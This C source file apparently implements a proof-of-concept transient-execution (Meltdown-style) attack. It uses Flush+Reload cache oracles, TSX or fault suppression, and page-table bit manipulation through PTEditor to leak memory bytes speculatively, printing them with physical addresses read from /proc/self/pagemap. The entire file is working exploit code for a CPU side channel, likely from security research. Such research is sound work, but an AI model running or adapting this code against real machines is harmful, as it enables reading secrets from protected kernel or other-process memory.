#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <memory.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include "../../cacheutils.h"
#include "../../PTEditor/ptedit_header.h"

#define PAGE_SIZE    4096
#define PAGE_COUNT   10
#define STEP         8

uint8_t __attribute__((aligned(PAGE_SIZE))) oracle1[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) oracle2[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) oracle3[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) read_page[PAGE_SIZE * PAGE_COUNT];
uint8_t __attribute__((aligned(PAGE_SIZE))) dummy_page[PAGE_SIZE];


void transient();

void * noncanon = (void*)0x5678ff0000000000ull,
     * nulladdr = (void*)NULL,
     * ptr_read, *ptr_target;

void setup_oracle(){
  memset(oracle1, 0, sizeof(oracle1));
  memset(oracle2, 0, sizeof(oracle2));
  memset(oracle3, 0, sizeof(oracle3));

  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);
}

void setup_fh(){
  signal(SIGSEGV, trycatch_segfault_handler);
  signal(SIGFPE, trycatch_segfault_handler);
}

#if SUP_SPECUL
uint8_t  __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];
void speculate_transient(int run) {
  flush(&run);
  for (int i = 0; i < 8; i++) {
      flush(throttle + i * 4096);
  }
  if((run / 2.0 / throttle[0] / throttle[4096] / throttle[8192] / throttle[3 * 4096]) >
      (throttle[4 * 4096] / throttle[5 * 4096] / throttle[6 * 4096] / throttle[7 * 4096]))
  {
      transient();
  }
}
#endif

int pagemap_fd = -1;
uint64_t get_phys_addr(void * virtual_addr_p) {
    if (pagemap_fd == -1)
      pagemap_fd = open("/proc/self/pagemap", O_RDONLY);

    uint64_t virtual_addr = (uint64_t)virtual_addr_p;
    uint64_t value = 0;
    uint64_t offset = (virtual_addr / 4096) * sizeof(value);
    int got = pread(pagemap_fd, &value, sizeof(value), offset);
    assert((value << 12) > 0);
    return (value << 12) | ((size_t)virtual_addr_p & 0xFFFULL);
}

int main(int argc, char* argv[])
{
  setup_oracle();
  setup_fh();
  ptedit_init();

  #if SUP_SPECUL
  for (int i = 0; i < 8; i++) {
    throttle[i * 4096] = 1;
  }
  #endif

  memset(read_page, 0, PAGE_SIZE * PAGE_COUNT);
  memset(dummy_page, 0, PAGE_SIZE);

  ptr_target = read_page;

  #if FAULTASSIST_S
  for(int i = 0; i < PAGE_COUNT; i++)
    ptedit_pte_clear_bit(&read_page[i*PAGE_SIZE], 0, PTEDIT_PAGE_BIT_USER);
  #elif FAULTASSIST_P
  for(int i = 0; i < PAGE_COUNT; i++)
    ptedit_pte_clear_bit(&read_page[i*PAGE_SIZE], 0, PTEDIT_PAGE_BIT_PRESENT);
  #elif FAULTASSIST_A
  for(int i = 0; i < PAGE_COUNT; i++)
    ptedit_pte_clear_bit(&read_page[i*PAGE_SIZE], 0, PTEDIT_PAGE_BIT_ACCESSED);
  #elif FAULTASSIST_NONCAN
  ptr_target = noncanon;
  #endif

  int goodaddress = 0;

  ptedit_cleanup();
  int offset = 0;
  while(1){
  for(int o = 0; o < 4096*PAGE_COUNT; o+=STEP){

    if(!goodaddress)
    offset = o;


  #if SUP_SPECUL
    ptr_read = dummy_page + offset;
    for(int i = 0; i < 64; i++){
      speculate_transient(10);
    }

    mfence();

    ptr_read = ptr_target + offset;
    speculate_transient(0);
  #else

  ptr_read = ptr_target + offset;

  #if SUP_TSX
    if (xbegin() == (~0u)) {
  #elif SUP_FH
    if(!setjmp(trycatch_buf)){
  #else
  {
  #endif
    transient();

  #if SUP_TSX
    xend();
  #endif
    }
  #endif

#if !LEAK_3BYTES
    for (size_t i = 1 ; i < 256; i++) {
      if (flush_reload((uint8_t*) oracle1 + 4096 * i)) {
          fprintf(stdout, "%p:" , ptr_read);
        #if !FAULTASSIST_NONCAN
          fprintf(stdout, "0x%lx:" , get_phys_addr(ptr_read));
        #endif
          fprintf(stdout, "%c\n", (uint8_t) i);
          fflush(stdout);
      }
    }
#else
    for (int i = 'A' ; i <= 'z'; i++) {
      if (flush_reload((uint8_t*) oracle1 + 4096 * i)) {
        for (int j = 'A' ; j <= 'z'; j++) {
          if (flush_reload((uint8_t*) oracle2 + 4096 * j)) {
            for (int k = 'A' ; k <= 'z'; k++) {
              if (flush_reload((uint8_t*) oracle3 + 4096 * k)) {
                fprintf(stdout, "%p:" , ptr_read);
                fprintf(stdout, "%c%c%c\n", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                fflush(stdout);
              }
            }
          }
        }
      }
    }
#endif

    mfence();
  }
  }
}

void  transient(){
  asm volatile(
    "mov (%0), %%rcx\n"
#if XMMLOAD
    "movups (%%rcx), %%xmm0\n"
    "movq %%xmm0, %%rax\n"
#elif YMMLOAD
    "vmovups (%%rcx), %%ymm0\n"
    "vpextrq $0, %%xmm0, %%rax\n"
#else
    "mov (%%rcx), %%rax\n"
#endif
    "mov %%rax, %%rbx\n"
    "mov %%rax, %%rcx\n"
    "and $0xff, %%rax\n"
    "shlq $12, %%rax\n"
    "movb (%1,%%rax,1), %%al\n"

#if LEAK_3BYTES
    "shr $8, %%rbx\n"
    "and $0xff, %%rbx\n"
    "shlq $12, %%rbx\n"
    "movb (%2,%%rbx,1), %%al\n"

    "shr $16, %%rcx\n"
    "and $0xff, %%rcx\n"
    "shlq $12, %%rcx\n"
    "movb (%3,%%rcx,1), %%al\n"
#endif
  : : "r"(&ptr_read), "r"(oracle1), "r"(oracle2), "r"(oracle3):
      "rax", "rbx", "rcx", "memory");
}
